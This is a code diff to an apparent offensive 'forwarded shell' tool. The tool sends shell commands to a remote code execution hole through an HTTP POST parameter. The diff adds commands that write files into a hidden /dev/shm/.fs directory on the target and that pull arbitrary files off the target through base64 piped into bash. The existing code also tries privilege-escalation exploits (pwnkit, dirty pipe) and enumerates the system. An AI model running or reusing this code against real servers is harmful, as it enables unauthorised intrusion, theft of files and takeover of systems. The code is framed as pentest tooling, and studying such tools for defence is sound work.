@@ -7,8 +7,8 @@ import signal
 import sys
 import time
 import argparse, re
-import subprocess
-from base64 import b64encode
+import subprocess, pdb
+from base64 import b64encode, b64decode
 from random import randrange
 
 # ------------------------------------
@@ -183,6 +183,7 @@ def tryExploits(url, parameter):
     execCommand(url, parameter, command_to_exec + "\n")
 
     resp = readCommand(url, parameter)
+    resp = cleanHTML(resp)
     print(resp)
     clearOutput(url, parameter)
 
@@ -191,6 +192,7 @@ def tryExploits(url, parameter):
     execCommand(url, parameter, command_to_exec + "\n")
 
     resp = readCommand(url, parameter)
+    resp = cleanHTML(resp)
     print(resp)
     clearOutput(url, parameter)
 
@@ -259,6 +261,45 @@ def getUserHostname(url, parameter):
 
     return user, hostname
 
+# Function to upload files
+def uploadFile(url, parameter, file_to_upload):
+    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Uploading file to the server" + c.END)
+    fileContent = open(file_to_upload, "r").read()
+    base64file = b64encode(fileContent.encode()).decode()
+    upload_command = f"""echo {base64file} | base64 -d > /dev/shm/.fs/{file_to_upload}"""
+
+    uploadData = {
+        f"{parameter}": f"{upload_command}"
+    }
+
+    r = requests.post(url, data=uploadData, timeout=8)
+
+    time.sleep(1)
+    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + f"] {file_to_upload} uploaded successfully in /dev/shm/.fs/{file_to_upload}\n" + c.END)
+
+# Function to download a file
+def downloadFile(url, parameter, file_to_download):
+    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Downloading file from the server" + c.END)
+    download_command = f"""base64 -w 0 {file_to_download}""" 
+    base64command = b64encode(download_command.encode()).decode()
+
+    downloadData = {
+        f"{parameter}": f"echo {base64command} | base64 -d | bash"
+    }
+    r = requests.post(url, data=downloadData, timeout=8)
+
+    time.sleep(1)
+    fileContent = cleanHTML(r.text)
+    fileContent = b64decode(r.text).decode()
+    fileContent = fileContent.replace('\\n', '\n')
+
+    stored_file = file_to_download.split('/')[-1]
+    f = open(f"{stored_file}", "w")
+    f.write(fileContent)
+    f.close()
+
+    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + f"] File downloaded successfully as {stored_file}\n" + c.END)
+
 # Clean RCE output
 def cleanHTML(out):
     clean = re.compile('<.*?>')
@@ -290,7 +331,8 @@ if __name__ == '__main__':
 
     print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type dfs-help to see a list of custom commands of this forwarded shell\n" + c.END)
 
-    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits", "dfs-binaries", "binaries-dfs"]
+    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits", "dfs-binaries", "binaries-dfs", "dfs-download", "download-dfs", "dfs-upload", "upload-dfs"]
+    
     # Loop to execute commands
     while True:
         if user == "root":
@@ -303,7 +345,9 @@ if __name__ == '__main__':
             print(c.YELLOW + "--------\t\t-----------" + c.END)
             print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups, system info...)" + c.END)
             print(c.BLUE + "dfs-binaries\t\tsearch common binaries that can be used in the pentest" + c.END)
-            print(c.BLUE + "dfs-exploit\t\ttry to escalate privileges using some exploits (pnwkit, dirty pipe)" + c.END)
+            print(c.BLUE + "dfs-upload\t\tupload a file to the server" + c.END)
+            print(c.BLUE + "dfs-download\t\tdownload the specified file from the server" + c.END)
+            print(c.BLUE + "dfs-exploit\t\ttry to escalate privileges using some exploits (pwnkit, dirty pipe)" + c.END)
             print(c.BLUE + "dfs-exit\t\texit from the forwarded shell and delete created files on the target\n" + c.END)
 
         if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
@@ -361,12 +405,34 @@ if __name__ == '__main__':
         if command_to_exec == "dfs-exploit" or command_to_exec == "exploit-dfs":
             tryExploits(url, parameter)
 
+        if command_to_exec == "dfs-upload" or command_to_exec == "upload-dfs":
+            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-upload file.txt" + c.END)
+            print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] It doesn't work with binaries\n" + c.END)
+        
+        try:
+            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-upload":
+                file_to_upload = command_to_exec.split(' ')[1]
+                uploadFile(url, parameter, file_to_upload)
+        except:
+            pass
+
+        if command_to_exec == "dfs-download" or command_to_exec == "download-dfs":
+            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-download /path/to/the/file" + c.END)
+            print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] It doesn't work with binaries\n" + c.END)
+
+        try:
+            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-download":
+                file_to_download = command_to_exec.split(' ')[1]
+                downloadFile(url, parameter, file_to_download)
+        except:
+            pass
+
         if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
             removeFiles(url, parameter)
             print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!\n" + c.END)
             sys.exit(0)
 
-        if command_to_exec not in customCommands:
+        if command_to_exec not in customCommands and not command_to_exec.startswith("dfs-upload ") and not command_to_exec.startswith("dfs-download "):
             execCommand(url, parameter, command_to_exec + "\n")
             # Read command output
             resp = readCommand(url, parameter)
